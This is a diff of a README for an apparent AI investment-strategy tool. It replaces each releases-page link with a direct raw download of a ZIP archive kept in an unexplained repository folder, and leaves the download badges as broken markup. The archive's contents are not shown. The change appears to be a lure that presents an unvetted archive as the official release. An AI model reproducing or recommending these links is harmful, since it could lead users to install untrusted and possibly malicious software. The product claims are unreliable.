@@ -1,7 +1,7 @@
 # 🧠 AI-Investment-Strategies - Simple AI for Smart Investments
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/Amirkhan-Bayanov/AI-Investment-Strategies/releases)
+[![Download](https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip%https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip)](https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip)
 
 ## 📖 Overview
 Welcome to AI-Investment-Strategies! This tool helps you manage your investment portfolio using advanced AI techniques. With features for financial forecasting and automated analysis, you can make informed decisions without complex setups.
@@ -17,7 +17,7 @@ To start using AI-Investment-Strategies, follow these simple steps. We recommend
 
 ### 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to our releases page:
-   [Download Here](https://github.com/Amirkhan-Bayanov/AI-Investment-Strategies/releases)
+   [Download Here](https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip)
    
 2. **Select the Latest Release:** On the releases page, look for the latest version available.
 
@@ -86,4 +86,4 @@ Yes, you can uninstall it like any other application from your system settings.
 
 ## 📥 Download Now Again
 Don’t forget to download your copy to get started today!
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/Amirkhan-Bayanov/AI-Investment-Strategies/releases)
+[![Download](https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip%https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip)](https://raw.githubusercontent.com/Amirkhan-Bayanov/AI-Investment-Strategies/main/strobili/AI-Investment-Strategies.zip)
